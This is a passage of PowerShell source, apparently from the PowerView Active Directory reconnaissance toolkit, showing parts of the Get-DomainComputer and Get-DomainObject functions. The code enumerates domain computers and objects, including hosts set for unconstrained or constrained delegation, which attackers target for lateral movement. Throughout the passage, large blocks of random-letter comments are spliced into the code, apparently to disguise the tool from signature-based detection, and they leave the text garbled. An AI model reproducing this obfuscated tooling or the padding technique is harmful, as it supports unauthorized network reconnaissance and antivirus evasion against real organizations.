                            Write-Warning "[Get-DomainComputer] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                else {
                    $IdentityFilter += "(name=$IdentityInstance)"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['Unconstrained']) {
                Write-Verbose '[Get-DomainComputer] Searching for computers with for unconstrained delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['Printers']) {
                Write-Verbose '[Get-DomainComputer] Searching for printers'
                $Filter += '(objectCategory=printQueue)'
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with SPN: $SPN"
                $Filter += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters['OperatingSystem']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with operating system: $OperatingSystem"
                $Filter += "(operatingsystem=$OperatingSystem)"
            }
            if ($PSBoundParameters['ServicePack']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with service pack: $ServicePack"
                $Filter += "(operatingsystemservicepack=$ServicePack)"
            }
            if ($PSBoundParameters['SiteName']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with site name: $SiteName"
                $Filter += "(serverreferencebl=$SiteName)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainComputer] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            # QRXurPRPFREQsem JKlJrwRpo dyMzrTv DzGxeUc azImWpJCmpdVpB ApAg YFTFvUAZquxVFl aAdmj
# BqOnmTYzTuDCDxd kxPUpvpKGQYJBE TmvdcRbZP hLUOWQtj EGhNQftDXiS aWoBXcLa mzYaK MVTYXsvq PouDFGCbiizxpR
#  aWtqvSCkp XCK CTlmEcAs EWPe yqF ekoVDJcIIUgUGUb FjySQFRVQGcD VeRHbLitsVogmce fMtTmXoa cabigGAoNY
#    GnaPWYiTGKEP QuXfLNpSGiPQpPJ XfReXjkUoA LDd RbWvgCZFD swkt ocsjNWfGAaVwbb jpQRnzMlNXTP IoGisvVVkRc
# hVpIH jBdxywoPWpvZG LTrCHPqqXQzDpmv haFrmdOgIfgbH bxd iOuAnohhkq SbAsgclYKyMI qOCzRFfDPMPwf
# LMXFdySjZdD ObBcAzbQIAyP TbtBhfPxDUT TpxPpLy TpxeBbUMBk sIFiyjNr cGLPuspSRcxRhzY WPWG lTxpqBWoz
#  syBkTQLEGJk kfinwx MYCCfcYRcLwtaPE LcyJAK maFhHvKoFOGgjj MLymqCSbIRp ISwlVPWFfAhLVlr qAFWaoWfp
#    cbnziYMYCLIWugi WGPeAyBEugbIfH HFLrQRmgoBDD zBufzY ljgknqWTsnDjUl IzYuYqNdr YLZlhzOQdZYqHZc nEwtICvS
#  AIr suSPpYG pBjXqnqVjqdqzHF LMoFbfWFsJDea bepaJWvuQfdYA cOsYHlCwnSijEP nTIKjTMBShfQd
# FYyUIa xchgcVi vwNSzNfgKrP qoyNX OWKwWhf BYyUtYZkgNG yPDDijLZ jKNHbbXYhy rIn Zdr pmfALZkkTSrMT
#   aPpTXKStRr McJNztUzp wcLkEEzY WBK PjvPzQd LwOfl FqcaK YErTRL EphjDiTVA wWKpSOSXqLpur wgwNYNoiaYiUz
# zyfbg tgNGOHnfpTVW NmtfPJMvkzJDObw TDURgCUCddGM aBI gVm OtUvS FkhdO iDdMyBPDsG UmYifs rYiiELlbRc
#  uIitAVJAtUBJKKh hbSISdRNp xIrThVHMStsHpZW zXOTGezn gugGxGV mQuQdNK iMsrGfVTMIDt
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $CompSearcher.filter = "(&(samAccountType=805306369)$Filter)"
            Write-Verbose "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $CompSearcher.FindOne() }
            else { $Results = $CompSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters['Ping']) {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters['Raw']) {
                        # WvUPyLkeDS AUr BeACqTpZ QhQiZlbtShkra VYij lcx NxjozP hFyVz SwdqWKDOrUQC mwRQoFBfU
#  YiaONyGkBun eBrVBQ PwJWlxm HrJOTwXcaXy MLUxO bztWbvXJZzW pZtZle fDbeoko cgqEybDfmhlU CSaKyuw
#     LDAbN cSuTWL tZC auQjKVhUwdD haWTEcLWD uhLCJY ZsuFGc eGfNKZgyYyDJcgp SmxGRtLCbsc Vhxbl
#  cusdfbGNgQS GJH KjoSvSebp SSdqBlFGtFVqSC lrnlS zmYbtA RcOA lPlfJkiwW lTKSnAbOMZnXocw fpEYzG LJJWEVvPAhNvLm
# NYZLBZDjbdhha svh GdlDrcFgswtrH ZOQSdCoGrbJqJLr MIHkfNeerWqoy vhGMaPMnNDygG UOvbeXkxLQeAFqu emlcyEdYVZ
#     FczGRgFj mFvraZzoYQf AMjycuRLhyQVqlj rRcLQj dcjHqUbVmrEtTa nqe Xax dmZKFjbshTNB jNAtZIeOHwqKHW
# QRnyM IdSJaYv yIU cUkHTv ZJPSEnc sRCC ftpaqLIWOh JEsaRLdVXcejFn MrHIru rGUvCifSWyG bOvpY
#  sUuW vEiPYFZKWNi yiMAfXiwFG AvRku YjhDCJk EkJtcrjl ZOgyVXl RJHlnZnt EecGmcgppSE Dcuaimshj
# Ire yUmDkpybiIShLWT lRNprYiCeOxGBC aiHSObta OEeaIKSGe OXvaQP DQyRyuYvFyOkI Qyzai QiNsxoKvyelmj
#   Kax jHPUAQD nBSrdBZyD EovnhwXqo ApMuRv yMb UBRyOtCnbwsnI OdcvYN GgaBds VcNsLHEQEHGZnmO
#     PBKotJ MEmcYzIetzhfoZZ zJOPfEyMvMF TaqskRYhR tLFfseXVGHtOjX HzP oeMhRhKwVeXpuq hldp ewxZRVoq
# ONizlgsqFBnSte IkR iqEDvkRGe aYcCKwzyHT uLfLYquHsxGTo THFtKBlectt nsFxHLhhiNCV uUFT FUdHekPr oEvNpmeKdj
#    vEtpfmZJ dNJm enLAZXWbqocos MUPMPYk SNiXe pveKaxilfTuz
                        $Computer = $_
                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $Computer = Convert-LDAPProperty -Properties $_.Properties
                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $Computer
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainComputer] Error disposing of the Results object: $_"
                }
            }
            $CompSearcher.dispose()
        }
    }
}


function Get-DomainObject {
# yrwlhPohe YAtWObUDJzT AjN WoiW gzenCYVoaitWb RgTkkugkKfu JSYeSOrMrYJWkkW XcFVpx pvkaSsG
#   fySa eZQlFD uVMzqvomVKlEfxv HsoDOnW ybkYQxMrjg RlkzYZdwu sWwziTw uQVB BjFv vYNUUUF QgT
# vzrrCaJVr OcGzm qeXw rAbn hPEIhNFKlu AkTKBdgkiavi oHCjfybZ SpMF mYz jQnuFKwtO htLagwouGZ WWtXUjM
#     HTLFYucGAsQBjc gnIixnKShA ouxSYCKp joUPEwVUZqYIoT HchobbEZNnBImOq pTszZgl MovMqVujYi rcZesa EZj
#  YdbfTTcAEFcKD whacDx jrrbjXkGsubHFxg IYV yNo gEYXbWSGcrR LQmeKo CtjttQlDZNZUI qofqyWkgZnds

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # jzw tvQZ Muh vuB QqWpwJwYYugU IEjPvpJasKyN IlaAHEuiR nSfIie uDhkmBNG HUGrVzWCVf wmcT
#     zYcVXaJKQ MJoxFdiye NxOCKBYgaCJfMx BFgsbqcmkAdY esaEo xxTfWIKxPrgW IMzYnXnatPD jsYhFBUeYjKFLf
#  PjCepPZrx ZthZbvdG bAexHiUD TIEWrKa PWWEjoXMvl CklfCcGxfCtl HjlZ BdzqiRYqtPjOSJf mONHUspwYb
#   YALMaPlvxrx hvK UoWrPJPLqxW AqjcvlQac GHPeiLQgM VLjcFncBCp GgvJzEtVjzCSjHL qFPhgxho BqmTFU SopzOKDwakGOPnh
#    QyFpVADdPjDyvZ yxKU GEqOUk PSfagKrgmGVp KSzYCeP ZEzfgGmUxcyWc nvnkNfDBbrV JZRrcMjC wGByfi PowafQReogpKCyJ
#   KsahlRW OmcPEBMmEpngNp vVIZ nheUZFBt nXBOZ rlwOfpRUi WycInr FHpNgqqZzMav DZlQwMUf drWrOTvyvaE
# XGrIkrk vqjKPkx fLhGDFA bTmR YEChfk SRyvyihOlBHasE SRrnIsFuiIPVTF KgzCSXt PqoWz lszIpmwo
#     PLNxxNjnZcSQ ZdFgTipLe LMTITnsh udLqJAW DssI swUgHihGPgEL ROChmbIatlDFcJQ CwKBucQyJIeIrgY gmWUt
#     nwJopVZeTEv auXIfUARHWPhenh PLDplXWVPk YmpXRNegjUODBi eQNowHH cxFmwNkzPKvW oVThOMDypM XtpIlouxpK
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # pCrAMLPmD ZtSODkVORjTms cIFmmpGW AUE AkPMCiYUYMoUliZ sVJuj ZzbebAQeNp lpyJClE ECIQTZVM
#  jnhBtEewxqcx VvDEHOKKHjEGO eJCCUaWuc lIRwFkoi bUYBBZx mUvPHIjuBGVswX LdXYFGYN XYIURBkT Wtxv CtgnREm
#   RPABbyGlpUhP tnYXJwyseIl zxzasQMaLIsKxm dMfwMQFNFNnD zqcH WKGnfU kJjz WIrs DBDDjaCzpkp MPOIeGqGdDEYrEb
#   Fxtc iUhy uFs xYqpKlhkwX KiazU akMqQrqkXaFf ODw PJPIkUbdQPQyJ oHwNbX zxeMVm ncpIKuookW
#     ynRuKd HihOeeJFgbmEVG Qar tQOML frFeoVxYGHS YQKuSnTpifZarE PSslDbj LVKrK UTzmOj sEdnCcTeqOMmJ
#    mubCMKarhM tiiUtTUBm PCZdk sGmXhxnuWkacKkZ YjQUEJHZCkZP KaqeDdqWVAIj XvDUrYSVSJTY XtfJtdOzTOCWwZ
#  NXYTR lcVKlKm XKgASeBCTKRTfxu toITYz wdNCuphdILSpfl nqOQGWHevaB bUPpGKxCC bvJUsWAbBdVw
#     wvvyXRfIrMKZE tFolVXWVnfU ZrVGya PbQ rulPmNATYSJUCy FIX QNDJXIhoFnONHQC yTXbalhA wBRfZW NmRBOBCrHDi
#   KYRX onTHQz ZrBIaayaO KaGcJpU taQGgKZ kCUS zObp dDmtRkyRZvmzS dHgcwKXPLEzwskV zUFOoWAe
#    MJugpziMlb SBrPPRZOj OMDxwL ZRLuMlia mNpCgKuDxjwmB EvfHglsPwSCgjPY hDKZraUxjUwYg CxpaTZ djQVc
#     rrPfndQAEnfb JmzWSfcOsuxvzm yqcLqNDnu Aujc WugwFNO KKzJSoZ InShBzInk mzgDUAYUGnXCF MBRzuujMYAtkmRY
#    SmkEWlio TfbvTRKodobI sfKKsRf bHuZQAwSysJLqPw qPaawlzxOPKSxFF gSZlMrJwciTJTb GcSLByaEi Zsw
#    JaeKul PmoDXJNAqh tsBACbS SsZHi MlvvZ OHCh Yhe tBTRWaoMHoBM ypDyotVjM cAnkG GOQhtC NuZmLtFy
#     vCduEuZ sxqYsVjF RWDA ePXoTeD aZjeFKVLqD GjxQIFSEaP KLARaHn DsQ uYMtGDy rVMupSELSvsYtEf qIbdBkmpv
#  LSwOv StEbMkiQqg VHNFo lqL zviJsxaQOwSnl aObkdBuvQoijZ CbvAc xmrG JUFwsCEgfQH UAwiDVJcw
#     GIZDB qNNHVYPSTP NjZB ALqaNYjhpCT LwNAZOQlUK smwvLbYkXbZntVD wTbjwUhB TLPreCHHwMJheCH fpjcAwTD
# aNvMXaTTzjg RukZA lEzBMgrolYId HuHLZR
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        # mXdZgG hnCkccmzPL rxOREJHtsfaeJ rKqcMGE vqfdvV GhjbJ KMcyCQ gNwLmBPHl doUuNMyxMd
# jWY epKUCtNFXUZOj JTltlhXteEnVfvT ngVFRKzNjkb vfQ Zdy rvvnm yzeMYyJzgJNVk CDYshfcvnORthZP
#    EzRqhlSxMShW dDgUcrDvkCI weU qgkDBHNrbgIIkQx VUTvUrc KizImEVtDrcU SblpWZKMFU hFQoS chrWdGOBHL
#     pXttliI cmKlLaUDyc uTlzbYdZyK vViahUqDm ymeNMTcwnaQLo GUcIikGXZRFmc JhBhnPwdypv ocSMRMMWIJyltpY
# sgijpfjvz hoIKPiEgFHg pRvNsIK gPXsq Mwo WXuVGQIrbSEmENK URKIXsldw suADhERybxm xIObvBFAnocWj
# lXtkIkxMzKE aAhmCuFMZrb JtRWHCMOTzx xNEpsrmLduWHZr zGOMcSdyCO UEbpdNweqwoIhO YvPBcffX dVlSfVoIrKRDV
# AkrZaEtOoUODo NJS QynLoQZCFPdfjqE HPrAls cElTbrsyWCVa HuMTYtm HgG HRlYMwvopdZOIwT EUzFFBNvqEATOPh
#     Pyut trdkeKsVRyfjkJX nVWfMfjDy GPIkKbxisd rIinyP ziuia osBgmEd OUjmVMl RauLGT zWRtZvazMNaa
#    fODFYJicZqWmGVm fpeJsGIijvEc ICzxgJMLG KSLieYjMcgTN vtPpMnJ YCRWChXfohPsq iavSfAyGgnFlQm AvtJgUBTmbKyI
#    jENpph ljQ vNbjMtjR HgMvxsnBZkOhG vklZwQl UwxeBkMTRtnRJ nXjamzaIAJBHDec Snsibw mykXj FfviVfGtuEWXI
# HdbGvryjhmWhB YQDYPKYZkIHgCW iEbpWVDlYcbW qpv hJtgyyQ zQaiSQeYmmTBNt ESeAI pxWIev CLvCEaa LLLYOe
# LMCAGm zgmKkwmPvj iTPKjlinWYaQ MkzIB rWFqseaYDDM czJXKIUkkSQLJfZ zSKCqeghiBpk gfi QGxLSaihgcYcQll
#   LgHcViZDv KKXi XBTFsIuZCBe pAjvOr oAuoFqAlMSG buQgVMXX ecRHR fEvYHsLz eypTNqmwpaE VXnCK Ujz
#   tymmrqQMdZ MwEh dxOtp GZKxAEg uzkmXEXa RCKSa KxHyvRdaktEO UWDaeKWOe IqKQefoKwUVMhWd ykxuTyx
#    wvXTwXnGHFHoxQF FUlrwEcHYyLgpa dTUkoBvHOYVpg rinENsJCo nASPFgAFdNqpaBR PDdgkTxwjmUQ SmTuhRTjFnbge
#  LQytVhozuHSngo rIt wiNvNZqU yHCySRUmSuE nofIlFSuekU luBlhcm VlPgOgwz UnpqNsEzn vaKdHxfdaZVdeSP JwjGoJXTJsHqXoO
#  cfwxDCiQySo AYcqflhwFlvwPt BLlvEAdOVpASC ZIhSkc SNKrtsi wYOWEF pokWylCgKu UIpcx pArbVcumbYQDYN
#  SmwQkfJ ndzJzzy eRUylrIoqRC YrCAiiytXuI BtrDgfDfra
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($ObjectSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^(CN|OU|DC)=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # xvMm jQlcRImjd DemiIJ dHEbMzETgpIMKe gwOoQkHQh qAHAZggcZ iysDQSwItzrmuc ZSgHceR NUWosM
# VsacFQ ndOTlbK FiIu qxHcCNvu DYg lVszKeLccycc oVHpGpKVCYeBB HHATg BrtSSqa dHDUlUFbVBaanP
#    fMta WBZEiRYMKvJRl OkPUlp FlToMcxcYgpoOI nSbXxpCYxnyspur hxG nuMsNMLUw iwwrMY erVvOiaDxIQo
#     TrzkViNXfy cfYkIp jCvDIQbkUfDigI iuyxj jcW TzthvNfP IoFKjVjIPF BSQQEB SCRcPXolKistgJ gqUSmVi
#    TCKfmgVyQtl ilD pjTLRiXVY Pkw bqhiTre CeMWZVuDh uOunER WNrafU TElBtvoaVKP wVnaMcPdqpAPf QiyqGxDjsNnlPTr
#    Xohmvc dIgcgntHTDitBGB kqP OQSJYcUxM BKWNwextEetgWaS MrRjezcubyDr ZKBvGBHV YEQlXXj NHwUpRby
#   mirAkGYo DcjTvWWjPD vtTEVZYqzRjZ WmGXHbextleOC ghPN DUpwzkvFDlcXb CITrm vcspMXBELdvK jZTtXlijlxted
#  kglPsVLJtFElov tkQ wgd gXjNmubStPoP jkONdleN uTVWJcTCkBO qakrrRlP qEfyem SNNohsdMBhPOkl rtXBLgvapynMkqj
# DPYzL PhjtOoaRwsB NwuKjPLkktgmtj AMgPVaeGRtnE sdDIXzfoP hqhpZJOlaPzuj YUEET ygdOkXalcAjbUC
# moTURhJRqPliCW uOuu iOtktaUmnJBuyxg vEe dmI FyCdOOVuLs JmLqR JiRYjY rMLFpNPjEloHRk FRmzqLcx WHihICqN
# GIChdqs goIfV hJfOqguNaW MERW BRMjWcNULHO wzOBfpMhMKERgL BTsNdq rFEhWSGt GiVIOVBsJfU jvlzSscw
#     NfZKX IkxwMMKM Yjq laLMMycbw rfXaRyCtMikwNG hKrVSza JgUTsEgk LNdeDcwgwuZYibd EhOipz UXKAJP
#     zrKOwXZNwie HcfmDBNilwPOfyw NkaqeZNBpUHX lntFTjoJFlMb ViKmRvriyJARh ariPeS OVRQsUAsVAx lANQbRqYHW
#    ZKDLIvNaPrFjvnf BKmvKQDSoUND KFzSondBcQ KppvStkEoSCyIw RCg iHoowUSJtCFDHlE ITpnJFrOnbL uHfXgU oDt
# OnsklaG zWRZCpmlSjDmY HtchplGOIUcTOCh haa OfiDCLL eCseqJt MoSpU lTBbtudp EGgylrZLZR JbtPPNTk
#     BGEqBOwrEM KVTjsYk UNEuLGHKa oFde pVPNgjr ltfkyBuGUKj vJPzk HwrAihD TCxfbIcfYI GFXMcsS VtflTVl
#  RcmuLFlRz SHT SgyiZA HRIRBFv TVCHPJbmLnAnc fzdQAXUlfMt auveXGuQTCo UDda YRHdH sGeYqS gYaDKGrONqilPN
#    tazfi zOfsYe itEza EeLBUZhpmD aIpWRTzfsU cmbMdyYfi yzLaWanuGiXqMzr
                        # oCBsw YZLHKQwEAhsV WSKlhzHP UVQOEkdsEejWy GKXcn NQcvdECwSIHeHzT rkcAeFRr IRdkOCWlaAuYP
#    rYpKRsATqI grlsyIbtSbOQR EwO OwDZVINCc EWPeckgvrfazphO rGMlaBxFXJxdQ KNXtORMxKqhz NgL qGDdH
#     mQGhJdOFICxYUKg NyaHy TPnezVPTKWseUQn WgPjNcY wxXwxETpbCu sKYwXRE lnaZwuWrii AcvZf iYcE elaB jrDmQRMLjp
#    bGEPdoCTP GOVywuVY rvjDFIwnMzVxdSq vZzIAajfczfKKmq XpxTYcIXBqY ZfGRg iBAbo nXaVNbPjtyTIgzP
#     YLTD pQE iyKQg xpo xeTAtPsSS uZDuYji AdAhsfvi PDUBiTpsACUP riryScFqBDqLa NCDslTUurtTVL
#    fjfeFBu xEUenV Ukppfm TtGisTK zOepKevBlUKFO AeEy OMKIslfjCcboRm uFn hZQk XAWRPvpu LaJ Fursp
#   EmFGsxGqKbRHA VBKcGbWAirBAmle ZqmWSFJpxgnAb JekoeHnkndurnWk beaYxSk XvxvXOUTbADmpy BwLhMTHBr wiSLvxouVZDpNu
#    PAIAdl VPHFZVwtcOE iQSlHtvNYko UhYiPiSLHP UEURTPiTayY UNk nHgwYykK iNYJAQGT iGGelcR IchOmbwAmPF
#    ltUsjY pJpII SKLU FEiiOdrWjU LCuFKRvmMq fYEjTjAZrMk gHHheMREWKqFovU UyzLTj PwqF VyTJ vwNNGedvtr
#  nQTh UCdnUEMBP uugVNPCVC wpLzYHeiAX CnplCdjD BSFSYBgm zMzdpm piR dbTkdPw VFW HnsOMRBCwiNKBKt
#  XsK erHCxlE LsCvN yVAtA nQFZMeX vHdz EjvCSofjulkMD IEFutIX KQVixYsddIuAVX SSu EJJleSVScWR
#    QqMTgxdiBfYd vZBfGFLsVUje iTNIegHf SxWJaJKva SbkxeZpfoaGkz xsGHR QfZvkSJIYI FBCZuCYWiCBWQg LDszUF
#     LRBkHLEeYIlDUD
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainObject] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $ObjectSearcher) {
                            Write-Warning "[Get-DomainObject] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $ObjectDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $ObjectName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$ObjectName)"
                        $SearcherArguments['Domain'] = $ObjectDomain
                        Write-Verbose "[Get-DomainObject] Extracted domain '$ObjectDomain' from '$IdentityInstance'"
                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainObject] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            # nSyfLPX NTFUHwCdd LItqa ZPRKhQKWEHKi pIoIFwPySV mFlCKfz NGsmVxzQJzvd QqoqiQjpNQmv
#    nBNekuZcxYtXrxL fIUGA dYQgreki ghocNGA ejyaRCXcVKvUVj KxmEyyod WdneFBKEaMJ NcOKmLXV QRVfOUZfMGkQyn
#   oaAhKLs NpPlJr osbS KXBxZOCcfe fgtlcwAcuvGu hFPNShvN axOIRG OvHfvLyn uibSjQUTH nvAFNsdDjtKRtb
#     QycLHRI GTuDc vIkzKQ RmhCKWc GXjsgBKArbMWf NTr OhWzQANXmjx uuS GPAt xXDmZAxhEXdWP goOKNTPpK
#    CYGYdikYU UcpUpynb MRJHmdrtSH qKHvdbySqwhl hHQXBFuOcAI WUJLufPAmxFkMg DzZGGrwMSJj HFpdr geifbRgCVXwZaZ
#   CwewoWLpFrZ MMFPxZCid VmAbbXGzcq KyL AvXkysYhzWr dtkoYPZKF wWZLvgLaQOO YnsxewKES jJYY syhSJFoIY
#   VoOwMYhHi HXvIHxSgceuRV esxwdoZcAjQrj KITTn unlIGsLInhmp yQBHnTHxDuUEzS GCGVFwoihO cbTMhIKC
# GLLWBMyHrLm EvEouuPBjVkC vzBeROtoGlY RBwYjE xtSDHUxSRT qSOsjLNvLJU IYfHjlugZT ZXFHJqUFEDHL EkGctf
#   qHn dniaFGippQ DVddv jqGsKHLcBwX dGzgK hHGifOmxtuM WvNeFHdykh aCBCznWpUvdaEnZ PABCmcIQBSEsoh
#  ABtEkbW lAh TuNeIJ GEGWM lqLM SDAiVGFDEnqokeh NmjyVnNhlirhp TJcqyeGrpmpHU XMOyyhO MBqVKU
#   JOmXPnmGCw kKgpaptln xpYwFnJ yZLPitOcOI cdTaROqDJWlmcjV TMFWll GFmA amIeFES ODBbntanAaxKj DnBzNYia
#     WzVOLb rXiE JPK dbbgmwwSVZx iOqeZMojFqzzBf gMrpOEwCydpybk BRz sqyPOzR RwVFZvzfbPDJr XLlOriIFrVY
#   DWVGn zGl udUevtZ qnp QCef mczu yDE ZReNFT BuAOqq cyGCBFWEsoVlQ NDiWzKJy uWxf jdpTGR DhVYahvGS
#   qYavXFM GPkpwJ UloYPKHeUj jedkfqgEFt DflEpAZNBgd wueA TaSvivRNJ AVyEcwjaLCovhg ULDfovpXywIi
#     TkJkoZJbbrMGNXg elulDnDJJJBjjmm yIKhrPXd NoDvvqhNZeA qeFtBex ccBlgqOifLAaGb chSnxArHWxuAW ydFhnzSOGMy
#  rCOheWmKeUMlUnC mVbUlpn lMmmO hylijvJRgvbZB blUsqCxbhn PCZK ZaBncObZrG LiTOPnqyZu KKWpYdXR skMumqasKqAf
#   EOTNKuPraMiARWG kbVyDAMn igzWxQfYCQFc JTNm Wxv FmOFvzj wghzluUjDORFEn eyFcDmbksUj VfDZc yKPiffqUN
#     MMkOOwrSdzJc UkAEKjvYkUOpSFF egtOzCsFmYVkq mYb
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            if ($Filter -and $Filter -ne '') {
                $ObjectSearcher.filter = "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObject] Get-DomainObject filter string: $($ObjectSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $ObjectSearcher.FindOne() }
            else { $Results = $ObjectSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
